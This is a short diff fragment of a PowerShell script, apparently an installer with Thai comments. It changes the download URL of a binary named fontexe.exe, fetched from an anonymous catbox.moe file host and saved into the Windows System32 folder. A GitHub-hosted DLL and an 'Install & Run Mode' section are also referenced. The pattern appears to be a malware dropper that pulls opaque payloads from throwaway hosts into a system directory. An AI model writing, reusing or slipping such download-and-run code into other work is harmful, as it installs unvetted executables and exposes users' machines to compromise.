@@ -28,7 +28,7 @@ $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/ref
 
 # ตัวเลือกที่ 3 - ไฟล์ fontexe
 $fontexeDestination = Join-Path $system32Path "fontexe.exe"
-$fontexeUrl = "https://files.catbox.moe/to1qn5.bin"
+$fontexeUrl = "https://files.catbox.moe/gox1ex.bin"
 
 # -----------------------------
 # Install & Run Mode (Option 1)
